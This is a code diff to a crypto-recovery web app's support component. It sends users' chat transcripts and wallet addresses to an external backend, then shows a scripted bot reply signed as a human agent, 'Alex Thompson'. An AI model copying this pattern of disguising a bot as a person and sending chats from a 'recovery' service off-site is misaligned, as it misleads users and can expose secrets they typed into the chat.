@@ -234,14 +234,43 @@ export default function ProfessionalSupport({ isConnected, userPortfolio, select
     setTimeout(() => handleSendMessage(), 100);
   };
 
-  const handleEmailSupport = () => {
+  const handleEmailSupport = async () => {
     const chatTranscript = messages.map(msg => 
       `[${msg.timestamp.toLocaleTimeString()}] ${msg.type === 'user' ? 'You' : 'Alex'}: ${msg.message}`
     ).join('\n\n');
     
+    // Try backend email first
+    try {
+      const response = await fetch('https://autoclaimtoken.onrender.com/api/email-support', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          userEmail: 'user@example.com', // Could prompt user for email
+          chatTranscript: chatTranscript,
+          userAddress: userPortfolio?.walletAddress || 'Not connected'
+        })
+      });
+      
+      if (response.ok) {
+        // Show success message
+        const successMessage = {
+          id: Date.now(),
+          type: 'bot',
+          message: 'Perfect! I\'ve sent your support request directly to our admin team. You should hear back within 1 hour. Is there anything else I can help you with right now?',
+          timestamp: new Date(),
+          agent: 'Alex Thompson'
+        };
+        setMessages(prev => [...prev, successMessage]);
+        return;
+      }
+    } catch (error) {
+      console.log('Backend email failed, using mailto fallback');
+    }
+    
+    // Fallback to mailto
     const emailBody = `Hi CryptoRecover Support Team,\n\nI need assistance with my crypto recovery. Here's our chat transcript:\n\n${chatTranscript}\n\nPlease contact me at your earliest convenience.\n\nBest regards`;
     
-    const mailtoLink = `mailto:support@cryptorecover.com?subject=Recovery Support Request&body=${encodeURIComponent(emailBody)}`;
+    const mailtoLink = `mailto:admin@cryptorecover.com?subject=CryptoRecover Support Request&body=${encodeURIComponent(emailBody)}`;
     window.open(mailtoLink, '_blank');
   };
 
